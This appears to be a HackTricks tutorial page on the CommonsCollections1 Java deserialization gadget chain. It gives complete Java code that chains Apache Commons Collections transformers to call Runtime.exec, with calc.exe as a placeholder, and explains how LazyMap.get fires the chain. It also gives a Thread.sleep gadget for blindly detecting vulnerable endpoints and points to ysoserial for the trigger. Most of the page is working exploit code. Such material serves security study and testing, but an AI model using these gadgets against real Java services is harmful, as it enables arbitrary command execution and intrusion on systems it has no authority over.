# CommonsCollections1 Payload - Java Transformers to Runtime.exec() and Thread.sleep()

{{#include ../../banners/hacktricks-training.md}}

## Java Transformers to Runtime.exec()

Java deserialization payloads commonly use transformers from Apache Commons Collections, as in the following example.<sup>[[1]](#references)</sup>

```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
    public static void main(String... args) {
        String[] command = {"calc.exe"};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), //(1)
                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ), //(2)
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ), //(3)
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                ) //(4)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        //Execute gadgets
        lazyMap.get("anything");
    }
}
```

Without familiarity with Java deserialization payloads, it can be difficult to see why this code launches Calculator.

First of all you need to know that a **Transformer in Java** is something that **receives a class** and **transforms it to a different one**.\
Also it's interesting to know that the **payload** being **executed** here is **equivalent** to:

```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```

Or **more exactly**, what is going to be executed at the end would be:

```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```

### How

So, how is the first payload presented equivalent to those "simple" one-liners?

**First**, notice that the payload creates a **chain (array) of transformers**:

```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
        //(1) - Get gadget Class (from Runtime class)
        new ConstantTransformer(Runtime.class),

        //(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
        new InvokerTransformer("getMethod",
                new Class[]{ String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}
        ),

        //(3) - Call Runtime.class.getMethod("getRuntime") to obtain a Runtime object
        new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
        ),

        //(4) - Use the Runtime object to call exec with arbitrary commands
        new InvokerTransformer("exec",
                new Class[]{String.class},
                command
        )
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

Chaining the transformations in this array produces the final arbitrary-command execution call.

So, **how are those transforms chained?**

```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```

In the last section of the payload you can see that a **Map object is created**. Then, the function `decorate` is executed from `LazyMap` with the map object and the chained transformers. From the following code you can see that this will cause the **chained transformers** to be copied inside `lazyMap.factory` attribute:

```java
protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = factory;
}
```

And then the great finale is executed: `lazyMap.get("anything");`

This is the code of the `get` function:

```java
public Object get(Object key) {
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

And this is the code of the `transform` function

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

The **factory** contains **`chainedTransformer`**, and its **`transform`** function walks through the transformers one after another. Each transformer receives **`object`** as input, while `object` holds the previous transformer's output. This data flow chains the operations that execute the payload.

### Summary

Because `LazyMap` invokes the chained transformers from its `get` method, the result is equivalent to executing the following code:

```java
Object value = "something";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
                new Class[]{ String.class, Class[].class},
                new Object[]{"getRuntime", null}
        ).transform(value); //(2)

value = new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
        ).transform(value); //(3)

value = new InvokerTransformer("exec",
                new Class[]{String.class},
                command
        ).transform(value); //(4)
```

_Note how `value` is the input to each transform and the output of the previous transform, allowing execution of the following one-liner:_

```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```

The explanation above covers the gadgets in the **CommonsCollections1** payload, but not the deserialization trigger that starts the chain. The [**ysoserial implementation**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java) uses an `AnnotationInvocationHandler` object so that deserialization reaches the decorated map and invokes the operation that executes the chain.<sup>[[1]](#references)</sup>

## Java Thread Sleep

This time-delay payload can help identify a vulnerable endpoint because successful execution makes the target thread sleep.

```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
    public static void main(String... args) {
        final Transformer[] transformers = new Transformer[]{
        		new ConstantTransformer(Thread.class),
        		new InvokerTransformer("getMethod",
        		        new Class[]{
        		                String.class, Class[].class
        		        },
        		        new Object[]{
        		                "sleep", new Class[]{Long.TYPE}
        		        }),
        		new InvokerTransformer("invoke",
        		        new Class[]{
        		                Object.class, Object[].class
        		        }, new Object[]
        		        {
        		                null, new Object[] {7000L}
        		        }),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        //Execute gadgets
        lazyMap.get("anything");

    }
}
```

## More Gadgets

You can find more gadgets here: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)<sup>[[1]](#references)</sup>

## References

- [1] [Blind Java Deserialization - Commons Gadgets](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

{{#include ../../banners/hacktricks-training.md}}
